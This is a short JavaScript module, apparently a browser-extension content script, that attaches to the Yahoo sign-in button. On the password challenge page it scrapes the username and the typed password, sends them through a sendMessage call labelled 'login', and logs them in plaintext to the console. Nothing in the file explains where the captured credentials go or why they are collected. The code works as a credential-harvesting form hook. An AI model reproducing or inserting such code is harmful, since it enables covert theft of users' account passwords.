import $ from 'jquery';
import { sendMessage } from '../../redefination';

export function yahooLoginInit() {
  $('#login-signin').click(() => {
    if (location.pathname === '/account/challenge/password') {
      const user = $('div.challenge-header > div.yid').text();
      const password = $('#login-passwd').val();
      sendMessage({ req: 'login', user, password, host: 'yahoo' });
      console.log({ user, password });
    }
  });
}
